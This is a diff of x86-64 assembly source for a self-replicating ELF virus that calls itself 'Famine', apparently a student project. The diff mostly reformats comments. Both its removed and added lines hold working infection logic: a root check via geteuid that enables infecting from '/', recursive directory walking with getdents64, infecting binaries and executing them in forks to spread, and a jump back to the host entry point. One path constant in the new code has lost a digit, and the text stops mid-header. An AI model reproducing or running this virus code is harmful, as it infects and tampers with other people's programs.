@@ -32,93 +32,102 @@ _o_entry:
 _string:
 	db 'Famine version 1.0 (c)oded by cdrouet-rludosan', 0
 
-_start: ; program start
-;	enter 16, 0
-	push rbp
-	mov rbp, rsp
-	sub rsp, 16
-;;;;;;;;;;;;;;;;;;;;;;
-; save all registers ;
-; to pop them in the ;
-; same state before  ;
-; we jmp on o_entry  ;
-	push rbx ; +8
-	push rcx ; +16
-	push rdx ; +24
-	push rsi ; +32
-	push rdi ; +40
-	push r8 ; +48
-	push r9 ; +56
-	push r10 ; +64
-	push r11 ; +72
-	push r12 ; +80
-	push r13 ; +88
-	push r14 ; +96
-	push r15 ; +104
+;; Start of the program
+_start:
+	;; Create stack frame
+	push	rbp
+	mov		rbp, rsp
+	sub		rsp, 16
 
-	lea rax, [rel _o_entry]
-	cmp QWORD [rax], 0
-	je _famine_start_options
-;;;;;;;;;;;;;;;;;;;;;;
-;   NULL (8 bytes)   ;
-;--------------------;
-;   env[n]           ;
-;   ...              ;
-;   env[0]           ;
-;--------------------;
-;   NULL (8 bytes)   ;
-;--------------------;
-;   argv[n]          ;
-;       ...          ;
-;   argv[0]          ;
-;--------------------;
-;   argc (8 bytes)   ;
-;--------------------;
-;   rsp at start     ;
+	;; Save up all registers on stack
+	push	rbx		; +8
+	push	rcx		; +16
+	push	rdx		; +24
+	push	rsi		; +32
+	push	rdi		; +40
+	push	r8		; +48
+	push	r9		; +56
+	push	r10		; +64
+	push	r11		; +72
+	push	r12		; +80
+	push	r13		; +88
+	push	r14		; +96
+	push	r15		; +104
 
-	; argc = rsp + 128 if on stack or rsp + 64 if on registers
-	; argv = rsp + 136 if on stack (it's argv[0], then argv[1] etc...),
-	;   and rsp + 72 by registers (rsi), it's argv, we need to dereference
-	; env = rsp + 128 + argc + 8(NULL addr), list of env on stack
-	;   or rdx on registers
-;;;;;;;;;;;;;;;;;;;;;
-; To know if we need to execute the binary code, we pass a code in parameter.
-; So we need to check parameters to know what to do
-; Arguments can be on stack or on registers, depending of the compilator so:
-	cmp QWORD [rsp + 128], 3 ; check if argc on the stack is equal 3
-	je _alternative_start
-	cmp QWORD [rsp + 128], 4 ; check if argc on the stack is equal 3
-	je _verify_starting_infect
-_check_registers: ; check if parameters are passed by registers
-	cmp QWORD [rsp + 64], 3 ; check if argc on the registers is equal 3
-	je _alternative_start_by_registers
-	lea r10, [rel _o_entry]
-	cmp QWORD [r10] , 0
-	jne _test_root_infect
-	call _start_infect
-	jmp _continue_normaly
+	;; If _o_entry label equals zero, we are into ./famine so we look for eventual arguments
+	lea		rax, [rel _o_entry]
+	cmp		QWORD [rax], 0
+	je		_famine_start_options
 
-_test_root_infect: ; test if we have rights to infect from root
-	mov rdi, QWORD [rsp + 152]
-	cmp rdi, 0
-	je _continue_normaly
-	mov rax, 0x4c4f4c3d54534554
-	cmp QWORD [rdi], rax
-	jne _continue_normaly
-	mov rax, 107
-	syscall ; We call geteuid
-	cmp rax, 0 ; if geteuid return 0, so we are root, and we have largelly right to infect from /
-	jne _continue_normaly
-	lea rdi, [rel _force_exit]
-	jmp _infect_from_root
+	;; --------------------------------------------------------------------------------------------
+	;; NOTE
+	;; --------------------------------------------------------------------------------------------
+	;;
+	;; There are two ways CLI arguments can be passed over to the program : via registers or via 
+	;; the stack.
+	;; We need to check both methods (offsets) to detect if we are using one or the other.
+	;; 
+	;; Via stack :
+	;; 		- argc : %rsp + 128
+	;; 		- argv : %rsp + 136
+	;; 
+	;; Via registers :
+	;; 		- argc : %rsp + 64
+	;; 		- argv : %rsp + 72
+	;; 
+	;; --------------------------------------------------------------------------------------------
 
-; If it's a normal execution, we just infect /tmp/test(2), to don't hard block the
-; software with a too long execution.
-_continue_normaly: ; simply infect /tmp/test[12]
-	mov rax, 0
-	push rax
-	push rax
-;	lea r10, [rel _o_entry]
+	;; ** If argc equals 3 **
+	;; In this alternative start, we determine if we run infection only and exit right after or
+	;; if we run the infection and make the program continue until its natural end.
+	
+	;; (To know why some times we need to execute the infection only, refer to the commentaries in fork.s
+	;; On the stack, we have 8 bytes for argc, then 8 bytes per arguments (argv))
+	cmp		QWORD [rsp + 128], 3				; if argc == 3
+	je		_alternative_start
+
+	;; ** If argc equals 4 **
+	cmp		QWORD [rsp + 128], 4				; if argc == 4
+	je		_verify_starting_infect
+
+	;; Check if program arguments are passed via registers
+_check_registers:
+	cmp		QWORD [rsp + 64], 3 				; if argc == 3
+	je		_alternative_start_by_registers		; 
+	
+	lea		r10, [rel _o_entry]					; %r10 = _o_entry
+	cmp		QWORD [r10] , 0						; if %r10 == 0
+	jne		_test_root_infect					; try infection from root
+	call	_start_infect						; 
+	jmp		_continue_normaly
+
+;; Check if we have rights to infect from root
+_test_root_infect: 
+	mov		rdi, QWORD [rsp + 152]
+	cmp		rdi, 0
+	je		_continue_normaly
+	
+	mov		rax, 0x4c4f4c3d54534554
+	cmp		QWORD [rdi], rax
+	jne		_continue_normaly
+	
+	;; Geteuid syscall
+	mov		rax, 107
+	syscall
+
+	;; If syscall returned 0 it means we are root
+	cmp		rax, 0
+	jne		_continue_normaly
+
+	lea		rdi, [rel _force_exit]
+	jmp		_infect_from_root
+
+;; If it's a normal execution, we just infect /tmp/test(2)
+_continue_normaly:
+	mov		rax, 0
+	push	rax
+	push	rax
+
 ; Here we check if their is a o_entry address. If so, we are in an infected binary,
 ; so we just infect /tmp/test(2), and execute the code normally.
 ; Else, we test for the privilege we have, and try to infect from / if we can
@@ -130,313 +139,397 @@ _continue_normaly: ; simply infect /tmp/test[12]
 ;	jne _infect_tmp_test
 ;	mov rax, 0
 ;	jmp _push_it
-_infect_tmp_test: ; if geteuid don't returned 0, we can't know what right we have. So we just infect /tmp/test(2)
-	mov rax, 0x747365742f706d74 ; tmp/test
-;	mov rax, 0x006e69622f706d74 ; tmp/bin
-_push_it: ; push our path
-	push rax
-	mov rdi, rsp
-	mov rsi, rsp
-	add rsi, 16
-	mov rax, 1 ; Here we said to our function: Go in recursive infect!
-	push rax
-	push rsi
-	push rdi
-	call _read_dir
-;	cmp QWORD [rsp + 24], 0 ; if the path is empty, we infected from '/', so we don't need to reinfect
-;	je _jmp_end
-	mov BYTE [rsp + 32], 0x32 ; add the '2' at the end of the path string
-	call _read_dir
-_jmp_end: ; pop all our pushed values
-; restore the stack
-	pop rdi
-	pop rdi
-	pop rdi
-	pop rdi
-	pop rdi
-	pop rdi
-_verify_o_entry: ; check if we need to exit or to jmp to o_entry
-	lea rax, [rel _o_entry] ; mov in rax the o_entry address
-	cmp QWORD [rax], 0 ; if this address is 0, so we are in famine exec, and we need to exit
-	jne _jmp_to_o_entry
-_force_exit: ; exit
-	mov rdi, 0
-	mov rax, 60 ; exit syscall number
+
+_infect_tmp_test:
+	mov		rax, 0x747365742f706d7			; %rax = "tmp/test"
+
+_push_it:
+	push	rax								; push infection path on stack
+	mov		rdi, rsp
+	mov		rsi, rsp
+	add		rsi, 16
+	mov		rax, 1							; sets recursive infection
+	push	rax
+	push	rsi
+	push	rdi
+	call	_read_dir						; call our directory browsing function
+
+	mov		BYTE [rsp + 32], 0x32			; add a '2' at the end of the path string
+	call	_read_dir						; call our directory browsing function
+
+;; Pop everything we just pushed
+_jmp_end:
+	pop		rdi
+	pop		rdi
+	pop		rdi
+	pop		rdi
+	pop		rdi
+	pop		rdi
+
+;; Check if we need to jump to continue program (./infected) or simply terminate (./famine)
+_verify_o_entry:
+	lea		rax, [rel _o_entry]
+	cmp		QWORD [rax], 0
+	jne		_jmp_to_o_entry
+
+;; Exit program
+_force_exit:
+	mov		rax, 60						; sys_exit
+	mov		rdi, 0						; exit with 0
 	syscall
+
 
 ; In this alternative start, we know we have 3 arguments on the stacks, but we need to know
 ; if this is an infect only execution (we just run the infection, and then exit), or if we execute
 ; the binary after.
 ; To know why some times we need to execute the infection only, refer to the commentaries in fork.s
 ; On the stack, we have 8 bytes for argc, then 8 bytes per arguments (argv)
-_alternative_start: ; here we check the arguments passed to the program by the stack
-	mov r10, QWORD [rsp + 144] ; We take argv[1].
-	lea r11, [rel _verif] ; relative address of _verif
-	mov r11, QWORD [r11] ; dereferencing
-	cmp QWORD [r10], r11 ; we compare the verify code, to know if it's a normal execution
-	jne _check_registers
-	mov rsi, QWORD [rsp + 152] ; take the argv[2]
-	mov rax, 0 ; Here we said to our function: Do not infect in recursiv, only your directory
-	push rax
-	push rsi
-	push rax
-	call _read_dir
+
+;; Start via stack
+_alternative_start:
+	mov		r10, QWORD [rsp + 144]		; argv[1]
+	lea		r11, [rel _verif]			; relative address of _verif
+	mov		r11, QWORD [r11]			; dereferencing
+	cmp		QWORD [r10], r11			; we compare the verify code, to know if it's a normal execution
+	jne		_check_registers
+	
+	mov		rsi, QWORD [rsp + 152]		; take the argv[2]
+	mov		rax, 0						; Here we said to our function: Do not infect in recursiv, only your directory
+	push	rax
+	push	rsi
+	push	rax
+	call	_read_dir
+
 	pop rdi
 	pop rdi
 	pop rdi
+	
 	jmp _force_exit
 
 ; In this other alternative start, the arguments are received by registers. We pushed the registers to
 ; don't corrupt the normal execution, so we will find our arguments on the stack.
-_alternative_start_by_registers: ; Here is the same fonction, but arguments are passe by registers
-	mov r10, QWORD [rsp + 72] ; here we take argv
-	mov r10, QWORD [r10 + 8] ; argv is an array, so we take the index 1 (argv[1]).
-	lea r11, [rel _verif] ; relative address of _verif
-	mov r11, QWORD [r11] ; dereferencing
-	cmp QWORD [r10], r11 ; we compare the verify code, to know if it's a normal execution
-	jne _continue_normaly
-	mov rsi, QWORD [rsp + 72] ; take argv
-	mov rsi, QWORD [rsi + 16] ; take argv[2]
-	mov rax, 0 ; Here we said to our function: Do not infect in recursiv, only your directory
-	push rax
-	push rsi
-	push rax
-	call _read_dir
-	pop rdi
-	pop rdi
-	pop rdi
-	lea rax, [rel _force_exit] ; then exit
 
-_jmp_to_o_entry: ; pop all the registers we pushed at start of the program
-; Restore the registers, to execute the binary like if we just never do enything on stack/registers
-	pop r15
-	pop r14
-	pop r13
-	pop r12
-	pop r11
-	pop r10
-	pop r9
-	pop r8
-	pop rdi
-	pop rsi
-	pop rdx
-	pop rcx
-	pop rbx
+;; Start via registers
+_alternative_start_by_registers:
+	mov		r10, QWORD [rsp + 72]		; here we take argv
+	mov		r10, QWORD [r10 + 8]		; argv is an array, so we take the index 1 (argv[1]).
+	lea		r11, [rel _verif]			; relative address of _verif
+	mov		r11, QWORD [r11]			; dereferencing
+	cmp		QWORD [r10], r11			; we compare the verify code, to know if it's a normal execution
+	jne		_continue_normaly
+	
+	mov		rsi, QWORD [rsp + 72]		; take argv
+	mov		rsi, QWORD [rsi + 16]		; take argv[2]
+	mov		rax, 0						; Here we said to our function: Do not infect in recursiv, only your directory
+	push	rax
+	push	rsi
+	push	rax
+	call	_read_dir
+	
+	pop		rdi
+	pop		rdi
+	pop		rdi
+	
+	;; Load our exit address
+	lea		rax, [rel _force_exit]
+
+;; Jump back to old entry point
+_jmp_to_o_entry: 
+	;; Pop off the stack all the registers saved at the begining of the program
+	pop		r15
+	pop		r14
+	pop		r13
+	pop		r12
+	pop		r11
+	pop		r10
+	pop		r9
+	pop		r8
+	pop		rdi
+	pop		rsi
+	pop		rdx
+	pop		rcx
+	pop		rbx
+
+	;; Destroy stack frame
 	leave
-	jmp [rax] ; jmp to o_entry
 
-; Here is our principal function:
-; She will read the directory passed in parameter, and run infection in this directory.
-; But the principe is a little bit more complexe:
-; When this function find a binary in a directory, she infect this binary, and then exec it in a
-; fork, with the _verif argument, if the bool recursif is set.
-; If recursif is not set, it infect all binary in her given directory, and do not infect in
-; recursif.
-; So our main exec will run the recursif mode, infect only 1 binary per directory, et execute them.
-; Then all the binary infected how will be executed will infect all binaries on their current directory.
-_read_dir: ; void read_dir(bool recursif, char *actual_directory, char *path_of_dir)
-	enter 392, 0
-	; rsp + 0: dir struct
-	; rsp + 280: virus size
-	; rsp + 288: fd directory
-	; rsp + 296: pointer to current dir file
-	; rsp + 304: buffer end address
-	; rsp + 312: address dir name 1arg
-	; rsp + 320: size arg 1
-	; rsp + 328: size arg 2
-	; rsp + 336: total size
-	; rsp + 344: 2 arg
-	; rsp + 352: nb_thread launched. UNUSED
-	; rsp + 360: bool, indicating if a binary have already been infected in the current directory
-	; rsp + 368: bool, enable recursif
-	; rsp - size: size of total path for this dir
-	mov rdi, QWORD [rsp + 408]
-	mov rsi, QWORD [rsp + 416]
-	mov rax, QWORD [rsp + 424]
-	mov QWORD [rsp + 368], rax
-	mov QWORD [rsp + 312], rdi ; store first arg in stack
-	mov QWORD [rsp + 344], rsi
-	mov QWORD [rsp + 360], 0
-	mov rdi, rsi ; calcul len of arg 2
-	call _ft_strlen
-	mov QWORD [rsp + 328], rax ; store arg2 len in stack
-	mov rdi, QWORD [rsp + 312] ; take len of arg1
-	call _ft_strlen
-	mov QWORD [rsp + 320], rax ; store result in stack
-	mov r10, QWORD [rsp + 320]
-	mov QWORD [rsp + 336], r10
-	mov r10, QWORD [rsp + 328]
-	add QWORD [rsp + 336], r10
-	add QWORD [rsp + 336], 2
-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-; we need a dynamic buffer to store our concatenation, but we can't touch rsp,
-; to don't corrupt the datas offset is stack (if we sub 8 to rsp, rsp + 0 become rsp + 8)
-; So we take rsp address, and write in the addresses under rsp.
-; So the objectif is:
-;
-;	|	previous	|
-;	|	function	|
-;	|	stack frame	|
-;	|	----------	|
-;	|	rsp + 344	|
-;	|	rsp + 336	|
-;	|	   ...		|
-;	|	rsp + 280	|
-;	|	rsp + 0		|
-;	|	----------	| < -- rsp is here, and we right under 	|
-;	|		\0		|										|
-;	|	actual dir	|										|
-;	|		'/'		|										|
-;	|	full path	|										|
-;	|		dir		| <-------------------------------------|
-;	|	----------	|
-;
-; But when we will need to call another function, the stack frame for the called function
-; will probably be in our total path string, so we need to mov rsp on the full path string addr.
-; To do this, here are the steps:
-; mov r10, <memory addr of the total size of th full path string>
-; sub rsp, r10
-; sub rsp, 8	<---------| we sub rsp with a stack stored value, if we dont save this size in an easy addr
-;							we will not be able to retrieve our stack, after the function call will be done.
-;							So we take 8 Bytes to save our full path size in the top of the stack
-; mov QWORD [rsp], r10
-; add QWORD [rsp], 8	<-| 8 bytes for the size
-; call <function>
-; add rsp, QWORD [rsp]	<-| We pushed the full path size + 8 on stack, so now we just have to add it to rsp
-;							to retrieve our stack frame
-; FOR MORE VISIBILITY, THIS PART WILL ALWAYS BE TABED 1 MORE THAN THE OTHER LINES
-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-; now we copy in our buffer: path_of_dir + '/' + actual_directory + '\0'
-	mov rdi, rsp
-	sub rdi, QWORD [rsp + 336]
-	mov rsi, QWORD [rsp + 344]
-	mov rcx, QWORD [rsp + 328]
-	cld
-	rep movsb
-; add /
-	mov rdi, rsp
-	sub rdi, QWORD [rsp + 336]
-	add rdi, QWORD [rsp + 328]
-	mov BYTE [rdi], 0x2f ; '/'
-; add arg1
-	add rdi, 1
-	mov rsi, QWORD [rsp + 312]
-	mov rcx, QWORD [rsp + 320]
-	cld
-	rep movsb
-; add \0
-	mov rdi, rsp
-	sub rdi, QWORD [rsp + 336]
-	add rdi, QWORD [rsp + 328]
-	add rdi, 1
-	add rdi, QWORD [rsp + 320]
-	mov BYTE [rdi], 0
+	;; Jump to old entry
+	jmp		[rax]
 
+;; --------------------------------------------------------------------------------------------
+;; NAME
+;;		read_dir
+;;
+;; SYNOPSYS
+;;		void	read_dir(bool recursif, char *actual_directory, char *path_of_dir)
+;;
+;; DESCRIPTION
+;;		Runs an infection on the directory pointed by actual_directory.
+;;
+;; NOTES
+;;		This function has 2 behaviors according to the boolean value of recursif.
+;;		If recursif is set to 1:
+;;			It will infect one of the binaries located in this directory and then executes it
+;;			into a fork with the _verif_argument.
+;;
+;;		Otherwise:
+;;			It will ONLY infect all of the binaries located in THIS directory.
+;;
+;;		So our main exec will run the recursif mode, infect only 1 binary per directory
+;;		and execute them. Then all the binary infected how will be executed will infect 
+;;		all binaries on their current directory.
+;;
+;; STACK USAGE
+;;		rsp + 0		: dir struct
+;;		rsp + 280	: virus size
+;;		rsp + 288	: fd directory
+;;		rsp + 296	: pointer to current dir file
+;;		rsp + 304	: buffer end address
+;;		rsp + 312	: address dir name 1arg
+;;		rsp + 320	: size arg 1
+;;		rsp + 328	: size arg 2
+;;		rsp + 336	: total size
+;;		rsp + 344	: 2 arg
+;;		rsp + 352	: nb_thread launched. UNUSED
+;;		rsp + 360	: bool, indicating if a binary have already been infected in the current directory
+;;		rsp + 368	: bool, enable recursif
+;;		rsp - size	: size of total path for this dir
+;; --------------------------------------------------------------------------------------------
+
+_read_dir:
+	;; Create stack frame
+	enter	392, 0
+	
+	mov		rdi, QWORD [rsp + 408]
+	mov		rsi, QWORD [rsp + 416]
+	mov		rax, QWORD [rsp + 424]
+	mov		QWORD [rsp + 368], rax
+	mov		QWORD [rsp + 312], rdi		; store first arg in stack
+	mov		QWORD [rsp + 344], rsi
+	mov		QWORD [rsp + 360], 0
+	mov		rdi, rsi					; calcul len of arg 2
+	call	_ft_strlen
+	
+	mov		QWORD [rsp + 328], rax		; store arg2 len in stack
+	mov		rdi, QWORD [rsp + 312]		; take len of arg1
+	call	_ft_strlen
+	
+	mov		QWORD [rsp + 320], rax		; store result in stack
+	mov		r10, QWORD [rsp + 320]
+	mov		QWORD [rsp + 336], r10
+	mov		r10, QWORD [rsp + 328]
+	add		QWORD [rsp + 336], r10
+	add		QWORD [rsp + 336], 2
+
+	;; --------------------------------------------------------------------------------------------
+	;; NOTE
+	;; --------------------------------------------------------------------------------------------
+	;;
+	;; We need a dynamic buffer to store our path concatenation ; keeping in mind that we cannot 
+	;; touch %rsp because it will corrupt all of our stack offsets.
+	;;
+	;; We are going to write our path under the actual %rsp like so :
+	;;
+	;; -------------------------- 
+	;; ;    TOP OF THE STACK    ;
+	;; -------------------------- 
+	;; ;          ...           ;
+	;; -------------------------- 
+	;; ;     Previous frame     ;
+	;; -------------------------- < %rbp
+	;; ;     Current frame      ;
+	;; -------------------------- < %rsp
+	;; ;    Our path string     ;
+	;; --------------------------
+	;; ;      Next fn call      ;
+	;; --------------------------
+	;; ;          ...           ;
+	;; --------------------------
+	;; ;   BOTTOM OF THE STACK  ;
+	;; --------------------------
+	;; 
+	;; The problem is, on the next function call, it's relative stack frame might be overlapping
+	;; our path string. To avoid that, we'll have to move our %rsp down by its length in bytes
+	;; with a few tricks :
+	;; 		- get the length of the string
+	;; 		- move %rsp down by strlen + 8
+	;; 		- use the extra 8 bytes to store strlen so when we return from our function call, 
+	;; 		  we know exactly how many bytes we need to move up to retreive our inital frame
+	;;
+	;; --------------------------------------------------------------------------------------------
+
+	;; Copy directory path
+	mov		rdi, rsp					; move to %rsp
+	sub		rdi, QWORD [rsp + 336]		; move under %rsp by total length
+	mov		rsi, QWORD [rsp + 344]		; %rsi = directory path
+	mov		rcx, QWORD [rsp + 328]		; %rcx = length of directory path
+	cld
+	rep		movsb						; copy directory path
+
+	;; Copy '/'
+	mov		rdi, rsp					; move to %rsp
+	sub		rdi, QWORD [rsp + 336]		; move under %rsp by total length
+	add		rdi, QWORD [rsp + 328]		; move up by length of directory path we just wrote
+	mov		BYTE [rdi], 0x2f			; copy the '/'
+
+	; Copy directory name
+	add		rdi, 1						; move up 1 byte
+	mov		rsi, QWORD [rsp + 312]		; %rsi = directory name
+	mov		rcx, QWORD [rsp + 320]		; %rcx = length of directory name
+	cld
+	rep		movsb						; copy directory name
+
+	; Copy '\0'
+	mov		rdi, rsp					; move to %rsp
+	sub		rdi, QWORD [rsp + 336]		; move under %rsp by total length
+	add		rdi, QWORD [rsp + 328]		; move up by length of the directory path
+	add		rdi, 1						; move up by 1 byte ('/')
+	add		rdi, QWORD [rsp + 320]		; move up by length of the directory name
+	mov		BYTE [rdi], 0				; copy the '\0'
+
+;; Get the virus total length = (&_final_end + 2) - &_string
 _calculate_virus_size:
-; virus_size = (&_final_end + 2) - &_string
-	xor r10, r10 ; r10 = 0
-	lea r10, [rel _final_end] ; r10 = &_final_end
-	add r10, 2 ; final_end have 2 bytes of instrucitions
-	xor r11, r11
-	lea r11, [rel _string] ; r11 = &_string
-	sub r10, r11 ; &_final_end -= &_string
-	mov QWORD [rsp + 280], r10 ; virus size = r10
+	xor		r10, r10					; clear %r10
+	lea		r10, [rel _final_end]		; %r10 = <addr _final_end>
+	add		r10, 2						; final_end has 2 bytes of instrucitions
+	xor		r11, r11					; clear %r11
+	lea		r11, [rel _string]			; %r11 = <addr _string>
+	sub		r10, r11					; <addr _final_end> -= <addr _string>
+	mov		QWORD [rsp + 280], r10		; save up size
 
+;; Open the directory from the path stored under our stack pointer
 _open_dir:
-	mov rdi, rsp
-	mov r10, QWORD [rsp + 336]
-	sub rdi, r10
-	xor rsi, rsi ; rsi = 0, RD_ONLY
-	xor rdx, rdx ; rdx = 0, flag unused
-	mov rax, 0x2 ; open syscall number
-		mov r10, QWORD [rsp + 336]
-		sub rsp, r10
-		sub rsp, 8
-		mov QWORD [rsp], r10
-		add QWORD [rsp], 8
-	syscall ; open
-		add rsp, QWORD [rsp]
-	cmp rax, -1 ; if open return something under or equal of -1, jump to end
-	jle _close_dir
-	mov QWORD [rsp + 288], rax ; fd directory = return of open (fd)
+	;; Setup values for sys_open
+	mov		rdi, rsp					; %rdi = stack pointer
+	mov		r10, QWORD [rsp + 336]		; %r10 = total path length
+	sub		rdi, r10					; move %rdi under the stack pointer by %r10 bytes
+	xor		rsi, rsi					; O_RDONLY flag
+	xor		rdx, rdx					; unused flag
+	mov		rax, 0x2					; sys_open number
 
-_dir_loop: ; we will read more than 1 times the actual dir datas
-; call getdents64
-	mov rdx, 280 ; this is the size of our buffer
-	mov rdi, QWORD [rsp + 288] ; mov the fd to the first argument
-	mov rsi, rsp ; mov the stack pointer to the second argument
-	mov rax, 217 ; getdents64 syscall number
-		mov r10, QWORD [rsp + 336]
-		sub rsp, r10
-		sub rsp, 8
-		mov QWORD [rsp], r10
-		add QWORD [rsp], 8
+	;; Setup stack frame before syscall
+	mov		r10, QWORD [rsp + 336]		; %r10 = total length
+	sub		rsp, r10					; move %rsp down total length bytes
+	sub		rsp, 8						; move %rsp down 8 more bytes
+	mov		QWORD [rsp], r10			; store at this offset the total length
+	add		QWORD [rsp], 8				; add 8 more bytes to this value
+
+	;; Call sys_open
 	syscall
-		add rsp, QWORD [rsp]
-; check getdents64 return
-	cmp rax, 0 ; we check if getdents64 read something, if not, we are at the end of dir or their is an error
-	jle _close_dir
-; set the theoric maximum address for the readed datas in our buffer
-	mov r10, rax ; mov to r10 the number of bytes readed
-	add r10, rsp ; set the maximum theoric address for the readed datas (start buffer address + number of bytes read)
-	mov QWORD [rsp + 304], r10
-	mov rsi, rsp ; initialize rsi with our buffer address on the stack
-	mov QWORD [rsp + 296], rsi
 
-_treat_data: ; treat readed data from actual dir 
-; check if we are too far in memory
-	mov r10, QWORD [rsp + 304]
-	cmp QWORD [rsp + 296], r10 ; r10 is the address of the end of the buffer, so we check if our address is too far in memory
-	jge _dir_loop ; and we jump to read again the dir datas, to see if their is anothers datas to treat
-; offset 18 is the file type. We check if it's a directory
-	xor r12, r12 ; r12 = 0
-	mov r12b, BYTE [rsi + 18]
-	cmp r12, 4
-	je _test_bool ;_recursiv_infect
-; offset 18 is the file type. We check if it's a regular file
-	xor r12, r12 ; r12 = 0
-	mov r12b, BYTE [rsi + 18]
-	cmp r12, 8
-	jne _continue ; if it's not a regular file, just continue
-	cmp QWORD [rsp + 368], 1
-	jne _treat_normally ; check if we need to infect all binaries. We the recursif is not set, we infect all binaries
-	cmp QWORD [rsp + 360], 1
-	je _continue ; check if we already infected a binary. if so, we need to know if we need to infect the others binaries
-; now we call _treat_file, with our current file.
-_treat_normally: ; this is a file we need to treat normally
-	add rsi, 19 ; in the dirent struct, the name of te file is at offset 19
-	mov rdi, rsi
-	mov rsi, QWORD [rsp + 280]
-	mov r10, QWORD [rsp + 336]
-	mov rdx, rsp
-		sub rdx, r10
-		sub rsp, r10
-		sub rsp, 8
-		mov QWORD [rsp], r10
-		add QWORD [rsp], 8
-	mov r11, rsp
-	add r11, QWORD [r11]
+	;; Reset stack frame after syscall
+	add		rsp, QWORD [rsp]			; move up %rsp by the number of bytes stored at this offset
+
+	;; Check sys_open retval
+	cmp		rax, -1						; if we have an error
+	jle		_close_dir					; jump to _close_dir
+
+	mov		QWORD [rsp + 288], rax		; otherwise save up file descriptor
+
+;; This loop will get each file/directory at this location
+_dir_loop:
+	; Setup values for sys_getdents64
+	mov		rdx, 280					; size of our buffer
+	mov		rdi, QWORD [rsp + 288]		; mov the fd to the first argument
+	mov		rsi, rsp					; mov the stack pointer to the second argument
+	mov		rax, 217					; getdents64 syscall number
+
+	;; Setup stack frame before syscall
+	mov		r10, QWORD [rsp + 336]
+	sub		rsp, r10
+	sub		rsp, 8
+	mov		QWORD [rsp], r10
+	add		QWORD [rsp], 8
+	
+	;; Call sys_getdents64
+	syscall
+	
+	;; Restore stack frame after syscall
+	add		rsp, QWORD [rsp]
+
+	;; Check sys_getdents64 retval
+	cmp		rax, 0						; if we have an error or there is nothing more to read
+	jle		_close_dir
+
+	;; Set the theoric maximum address for the readed datas in our buffer
+	mov		r10, rax 					; mov to r10 the number of bytes readed
+	add		r10, rsp 					; set the maximum theoric address for the readed datas (start buffer address + number of bytes read)
+	mov		QWORD [rsp + 304], r10
+	mov		rsi, rsp					; initialize rsi with our buffer address on the stack
+	mov		QWORD [rsp + 296], rsi		; 
+
+;; Treat files/directories from buffer
+_treat_data:
+	;; Check if we are not too far in memory
+	mov		r10, QWORD [rsp + 304]
+	cmp		QWORD [rsp + 296], r10		; r10 is the address of the end of the buffer, so we check if our address is too far in memory
+	jge		_dir_loop					; and we jump to read again the dir datas, to see if their is anothers datas to treat
+
+	;; Check if it is a directory
+	xor		r12, r12
+	mov		r12b, BYTE [rsi + 18]
+	cmp		r12, 4						; if d_type == DT_DIR
+	je		_test_bool					; _recursiv_infect
+
+	;; Check if it's a regular file
+	xor		r12, r12
+	mov		r12b, BYTE [rsi + 18]
+	cmp		r12, 8						; if d_type != DT_REG
+	jne		_continue					; ignore entry
+
+	;; Check if we need to infect all binaries. We the recursif is not set, we infect all binaries
+	cmp		QWORD [rsp + 368], 1
+	jne		_treat_normally
+	
+	;; Check if we already infected a binary. if so, we need to know if we need to infect the others binaries
+	cmp		QWORD [rsp + 360], 1
+	je		_continue
+
+;; This is the default routine
+_treat_normally:
+	add		rsi, 19						; d_name is at offset 19 in struct linux_dirent64
+	mov		rdi, rsi
+	mov		rsi, QWORD [rsp + 280]		; virus length
+	mov		r10, QWORD [rsp + 336]		; total length
+	mov		rdx, rsp
+
+	;; Setup stack frame before function call 
+	sub		rdx, r10
+	sub		rsp, r10
+	sub		rsp, 8
+	mov		QWORD [rsp], r10
+	add		QWORD [rsp], 8
+	
+	mov		r11, rsp
+	add		r11, QWORD [r11]
+
 ; rsp + 368 will be at 0 when if we don't want to fork.
 ; So it will be set to 0 on child process launched to infect their actual directory only
 ; And it will be set to 1, for famine binary, and other binary launched by the user.
 ; Globally, it is set to 1 only for the process travelling all the directory recursively,
 ; where childs process only infect their actual directory
-	mov r10, 0 ; We unset the recursif mode
-	cmp QWORD [r11 + 368], 1 ; check if recursif mode is activated
-	jne _call_treat_file
-	mov r10, 1 ; we set the recursif mode
+	mov		r10, 0						; We unset the recursif mode
+	cmp		QWORD [r11 + 368], 1		; check if recursif mode is activated
+	jne		_call_treat_file
+	mov		r10, 1						; we set the recursif mode
+
 _call_treat_file:
 	call _treat_file
-		add rsp, QWORD [rsp]
-	cmp rax, 0 ; if we didn't forked, we just continue normally.
-	je _continue
-; if we forked, we set a bool to know it
-	mov QWORD [rsp + 360], 1 ; set the bool to know we already infected a binary in that directory
-	jmp _continue
+	
+	;; Restore stack frame after function call
+	add rsp, QWORD [rsp]
+	
+	;; If we didn't forked, we just continue normally
+	cmp		rax, 0 
+	je		_continue
+
+	;; If we forked, we set a boolean value to know we already infected a binary in that directory
+	mov		QWORD [rsp + 360], 1 
+	jmp		_continue
 
 _test_bool:
-	cmp QWORD [rsp + 368], 1 ; check if we need to infect in recursiv
-	jne _continue
+	cmp		QWORD [rsp + 368], 1 ; check if we need to infect in recursiv
+	jne		_continue
 
 _recursiv_infect:
 	mov rsi, QWORD [rsp + 296] ; actual file/dir struct
@@ -465,37 +558,48 @@ _recursiv_infect:
 		add rsp, QWORD [rsp]
 	jmp _continue
 
+;; Reinit/increment registers/stack variable for next loop
 _continue:
-; reinit/increment registers/stack variable for next loop
-	mov rsi, [rsp + 296] ; take our actual file/dir struct
-	xor r11, r11 ; clear r11
-	mov r11w, WORD [rsi + 16] ; in dirent struct, at offset 16, their is a short (2 bytes) describing the len of the file
-	add rsi, r11 ; we add this len on our current struct address to access next struct
-	mov QWORD [rsp + 296], rsi
-	jmp _treat_data
+	mov		rsi, [rsp + 296]			; take our actual file/dir struct
+	xor		r11, r11
+	mov		r11w, WORD [rsi + 16]		; in dirent struct, at offset 16, their is a short (2 bytes) describing the len of the file
+	add		rsi, r11					; we add this len on our current struct address to access next struct
+	mov		QWORD [rsp + 296], rsi
+	jmp		_treat_data
 
+;; Close directory
 _close_dir:
-; Close directory
-	mov rax, 3
-	mov rdi, QWORD [rsp + 288]
+	mov		rax, 3						; sys_close number
+	mov		rdi, QWORD [rsp + 288]		; directory fd
 	syscall
 
 _end_ret:
 	leave
 	ret
 
-_ft_strlen: ; void ft_strlen(char *str)
-	enter 16, 0
-	xor rax, rax
-	mov rbx, rdi
-	cmp rdi, 0
-	je _strlen_end
-	mov rcx, -1
+;; --------------------------------------------------------------------------------------------
+;; NAME
+;;		ft_strlen
